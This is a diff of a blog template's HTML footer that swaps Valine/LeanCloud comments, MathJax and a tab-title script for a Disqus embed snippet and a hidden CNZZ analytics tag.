-	var search_path = "search.xml";
-	if (search_path.length === 0) {
-		search_path = "search.xml";
-	}
-	var path = "/" + search_path;
-	searchFunc(path, "local-search-input", "local-search-result");
-</script>
+    /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
+    var disqus_shortname = 'undefined'; // required: replace example with your forum shortname
 
-
-
-    
-        <script type="text/javascript" src="https://cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
-<script type="text/javascript" src="//unpkg.com/valine/dist/Valine.min.js"></script>
-<script type="text/javascript" src="/js/plugins/valine.js?v=1.0.7"></script>
-    
-
-
-
-<script type="text/javascript" src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
-<script type="text/javascript" src="/js/plugins/leancloud_visitors.js?v=1.0.7"></script>
-
-
-
-    <!-- mathjax config similar to math.stackexchange -->
-<script type="text/x-mathjax-config">
-    MathJax.Hub.Config({
-        tex2jax: {
-            inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
-            processEscapes: true,
-            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
-        }
-    });
-</script>
-
-<script type="text/x-mathjax-config">
-    MathJax.Hub.Queue(function() {
-        var all = MathJax.Hub.getAllJax(), i;
-        for (i=0; i < all.length; i += 1) {
-            all[i].SourceElement().parentNode.className += ' has-jax';
-        }
-    });
-</script>
-
-<script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
-
-
-
-
-    <script>
+    /* * * DON'T EDIT BELOW THIS LINE * * */
     (function() {
-        var OriginTitile = document.title, titleTime;
-        document.addEventListener('visibilitychange', function() {
-            if (document.hidden) {
-                document.title = '思维失去连接...';
-                clearTimeout(titleTime);
-            } else {
-                document.title = '(つェ⊂)咦!又好了!';
-                titleTime = setTimeout(function() {
-                    document.title = OriginTitile;
-                },2000);
-            }
-        });
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
     })();
 </script>
+<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+-->
+<div style="display:none">
+<script src="http://s4.cnzz.com/stat.php?id=undefined&web_id=undefined" language="JavaScript"></script>script>
+</div>
 
 
-    
+
+
+
+
 </body>
 </html>
